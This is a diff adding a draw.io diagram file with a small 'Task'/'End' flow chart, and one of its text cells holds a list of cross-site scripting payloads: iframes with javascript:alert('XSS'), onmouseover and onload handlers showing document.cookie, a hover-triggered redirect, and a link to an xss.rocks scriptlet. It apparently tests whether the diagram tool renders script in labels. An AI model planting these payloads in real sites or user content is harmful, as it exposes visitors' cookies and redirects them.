@@ -1,0 +1,60 @@
+<mxfile host="app.diagrams.net" modified="2023-06-21T08:23:16.331Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" etag="jFXbMZYZjWgQ3k4gjMnO" version="21.5.0" type="github">
+  <diagram name="Trang-1" id="rilgfFn0dm8-1_RlxOkk">
+    <mxGraphModel dx="1434" dy="764" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+      <root>
+        <mxCell id="0" />
+        <mxCell id="1" parent="0" />
+        <mxCell id="42JPCgYe1txJgRVNadL5-1" value="&lt;pre style=&quot;overflow-wrap: break-word;&quot;&gt;&lt;br&gt;&lt;/pre&gt;&lt;pre style=&quot;overflow-wrap: break-word;&quot;&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&quot;&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&amp;lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&lt;br/&gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&lt;br/&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script&amp;gt;alert(`TEXT YOU WANT TO BE DISPLAYED`);&amp;lt;/script&amp;gt;&amp;lt;iframe frameborder=&quot;0%EF%BB%BF&lt;br/&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME width=&quot;420&quot; height=&quot;315&quot; SRC=&quot;http://www.youtube.com/embed/sxvccpasgTE&quot; frameborder=&quot;0&quot; onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;http://www.youtube.com/embed/sxvccpasgTE&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME width=&quot;420&quot; height=&quot;315&quot; frameborder=&quot;0&quot; onmouseover=&quot;document.location.href=&#39;https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr&lt;br/&gt;g&#39;&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;Hover the cursor to the LEFT of this Message&amp;lt;/h1&amp;gt;&amp;amp;ParamHeight=250&lt;br/&gt;&amp;lt;IFRAME width=&quot;420&quot; height=&quot;315&quot; frameborder=&quot;0&quot; onload=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&lt;br/&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&quot;&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;123&amp;lt;/h1&amp;gt;&lt;br/&gt;&amp;lt;iframe src=http://xss.rocks/scriptlet.html &amp;lt;&lt;br/&gt;&amp;lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&lt;br/&gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&lt;/pre&gt;" style="text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;whiteSpace=wrap;html=1;labelBackgroundColor=none;fontColor=#FEFAE0;" vertex="1" parent="1">
+          <mxGeometry x="60" y="850" width="1030" height="580" as="geometry" />
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-2" value="Vertical Flow Layout" style="swimlane;startSize=20;horizontal=1;childLayout=flowLayout;flowOrientation=north;resizable=0;interRankCellSpacing=50;containerType=tree;fontSize=12;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;" vertex="1" parent="1">
+          <mxGeometry x="660" y="1050" width="270" height="697" as="geometry" />
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-3" value="&lt;font color=&quot;#000000&quot;&gt;&#39;&lt;br&gt;&lt;br&gt;&quot;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;&quot;&amp;gt;123&lt;/font&gt;&lt;/h1&gt;&lt;font color=&quot;#000000&quot;&gt;&lt;br&gt;&lt;br&gt;&quot;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;123&lt;/font&gt;&lt;/h1&gt;&lt;font color=&quot;#000000&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;123&lt;/font&gt;&lt;/h1&gt;&lt;font color=&quot;#000000&quot;&gt;&lt;br&gt;&quot;&amp;gt;123&lt;br&gt;&quot;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;123&lt;/font&gt;&lt;/h1&gt;&lt;font color=&quot;#000000&quot;&gt;&lt;br&gt;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;Hover the cursor to the LEFT of this Message&lt;/font&gt;&lt;/h1&gt;&lt;font color=&quot;#000000&quot;&gt;&amp;amp;ParamHeight=250&lt;br&gt;&lt;br&gt;&quot;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;&quot;&amp;gt;123&lt;/font&gt;&lt;/h1&gt;&lt;font color=&quot;#000000&quot;&gt;&lt;br&gt;&quot;&amp;gt;&lt;/font&gt;&lt;h1&gt;&lt;font color=&quot;#000000&quot;&gt;123&lt;/font&gt;&lt;/h1&gt;" style="whiteSpace=wrap;html=1;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;" vertex="1" parent="42JPCgYe1txJgRVNadL5-2">
+          <mxGeometry x="85" y="40" width="100" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-4" value="Task" style="whiteSpace=wrap;html=1;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;" vertex="1" parent="42JPCgYe1txJgRVNadL5-2">
+          <mxGeometry x="20" y="546.5" width="100" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-5" value="" style="html=1;rounded=1;curved=0;sourcePerimeterSpacing=0;targetPerimeterSpacing=0;startSize=6;endSize=6;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;noEdgeStyle=1;orthogonal=1;" edge="1" parent="42JPCgYe1txJgRVNadL5-2" source="42JPCgYe1txJgRVNadL5-3" target="42JPCgYe1txJgRVNadL5-4">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="111.25" y="508.5" />
+              <mxPoint x="70" y="534.5" />
+            </Array>
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-6" value="Task" style="whiteSpace=wrap;html=1;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;" vertex="1" parent="42JPCgYe1txJgRVNadL5-2">
+          <mxGeometry x="150" y="546.5" width="100" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-7" value="" style="html=1;rounded=1;curved=0;sourcePerimeterSpacing=0;targetPerimeterSpacing=0;startSize=6;endSize=6;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;noEdgeStyle=1;orthogonal=1;" edge="1" parent="42JPCgYe1txJgRVNadL5-2" source="42JPCgYe1txJgRVNadL5-3" target="42JPCgYe1txJgRVNadL5-6">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="158.75" y="508.5" />
+              <mxPoint x="200" y="534.5" />
+            </Array>
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-8" value="End" style="whiteSpace=wrap;html=1;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;" vertex="1" parent="42JPCgYe1txJgRVNadL5-2">
+          <mxGeometry x="85" y="636.5" width="100" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-9" value="" style="html=1;rounded=1;curved=0;sourcePerimeterSpacing=0;targetPerimeterSpacing=0;startSize=6;endSize=6;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;noEdgeStyle=1;orthogonal=1;" edge="1" parent="42JPCgYe1txJgRVNadL5-2" source="42JPCgYe1txJgRVNadL5-4" target="42JPCgYe1txJgRVNadL5-8">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="70" y="598.5" />
+              <mxPoint x="112.5" y="624.5" />
+            </Array>
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="42JPCgYe1txJgRVNadL5-10" value="" style="html=1;rounded=1;curved=0;sourcePerimeterSpacing=0;targetPerimeterSpacing=0;startSize=6;endSize=6;strokeColor=#DDA15E;fontColor=#FEFAE0;fillColor=#BC6C25;noEdgeStyle=1;orthogonal=1;" edge="1" parent="42JPCgYe1txJgRVNadL5-2" source="42JPCgYe1txJgRVNadL5-6" target="42JPCgYe1txJgRVNadL5-8">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="200" y="598.5" />
+              <mxPoint x="157.5" y="624.5" />
+            </Array>
+          </mxGeometry>
+        </mxCell>
+      </root>
+    </mxGraphModel>
+  </diagram>
+</mxfile>
